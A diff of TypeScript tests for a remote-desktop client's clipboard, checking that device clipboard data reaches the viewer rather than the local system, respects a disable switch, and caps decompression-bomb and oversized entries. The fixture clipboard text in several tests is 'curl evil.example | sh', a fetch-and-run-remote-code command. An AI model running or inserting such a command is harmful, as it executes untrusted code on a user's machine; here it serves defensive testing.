@@ -317,15 +317,57 @@ describe('device clipboard', () => {
 
 	test('Disable clipboard keeps the device clipboard out of the operator clipboard, also when set before streaming', async () => {
 		const c = await client();
-		const write = vi.spyOn(g.RDClipboard, 'writeLocalRich').mockResolvedValue({ ok: true });
+		const handed: unknown[] = [];
+		c.on('clipboard_remote', (e: unknown) => void handed.push(e));
 		c.setDisableClipboard(true);
 		c._state = 'streaming';
 		await c._applyRemoteClipboard([entry()]);
-		expect(write).not.toHaveBeenCalled();
+		expect(handed).toEqual([]);
 
 		c.setDisableClipboard(false);
 		await c._applyRemoteClipboard([entry()]);
-		expect(write).toHaveBeenCalledOnce();
+		expect(handed).toEqual([{ text: 'curl evil.example | sh', pngBlob: null }]);
+	});
+
+	test('the device clipboard goes to the viewer, never straight to this computer', async () => {
+		const c = await client();
+		const write = vi.spyOn(g.RDClipboard, 'writeLocalRich');
+		const handed: unknown[] = [];
+		c.on('clipboard_remote', (e: unknown) => void handed.push(e));
+		c._state = 'streaming';
+		const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47]);
+		await c._applyRemoteClipboard([entry(), { content: png, format: 22 }]);
+		expect(write).not.toHaveBeenCalled();
+		expect(handed).toHaveLength(1);
+		const got = handed[0] as { text: string; pngBlob: Blob };
+		expect(got.text).toBe('curl evil.example | sh');
+		expect(got.pngBlob.type).toBe('image/png');
+		expect(got.pngBlob.size).toBe(4);
+	});
+
+	test('an entry over the cap is left out and the viewer is told', async () => {
+		const c = await client();
+		let tooLarge = 0;
+		const handed: unknown[] = [];
+		c.on('clipboard_too_large', () => void tooLarge++);
+		c.on('clipboard_remote', (e: unknown) => void handed.push(e));
+		c._state = 'streaming';
+		await c._applyRemoteClipboard([{ content: new Uint8Array(g.RDClipboard.MAX_BYTES + 1), format: 22 }]);
+		expect(tooLarge).toBe(1);
+		expect(handed).toEqual([]);
+	});
+
+	test('sending the clipboard says whether it went out', async () => {
+		const c = await client();
+		expect(await c.sendClipboard('not yet')).toBe(false);
+		c._state = 'streaming';
+		const sent: unknown[] = [];
+		c._sendPeerMessage = (m: unknown) => void sent.push(m);
+		expect(
+			await c.sendClipboard({ text: 'hi', pngBlob: new Blob([new Uint8Array(8)], { type: 'image/png' }) })
+		).toBe(true);
+		expect(sent).toHaveLength(1);
+		expect(Object.keys(sent[0] as object)).toEqual(['multiClipboards']);
 	});
 
 	test('a background tab does not decode the device clipboard at all', async () => {
@@ -337,9 +379,9 @@ describe('device clipboard', () => {
 		expect(decode).not.toHaveBeenCalled();
 	});
 
-	test('a compressed entry is inflated in chunks and given up past 16 MB', async () => {
+	test('a compressed entry is inflated in chunks and given up past 40 MB', async () => {
 		let pulled = 0;
-		// A zstd stream that would inflate to 64 MB, one 1 MB chunk per read
+		// A zstd stream that would inflate to 64 MB, one 1 MB chunk per read; the cap stops it at 40
 		class Bomb {
 			writable = new WritableStream();
 			readable = new ReadableStream({
@@ -353,7 +395,7 @@ describe('device clipboard', () => {
 		const zstd = new Uint8Array([0x28, 0xb5, 0x2f, 0xfd, 1, 2, 3]);
 		try {
 			expect(await g.RDClipboard.decodeEntry({ content: zstd, compress: true, format: 0 })).toBeNull();
-			expect(pulled).toBeLessThan(20);
+			expect(pulled).toBeLessThan(44);
 			pulled = 0;
 			await expect(g.RDCompress.decompressZstd(zstd, { force: true, maxBytes: 4 << 20 })).rejects.toThrow(
 				/larger than/
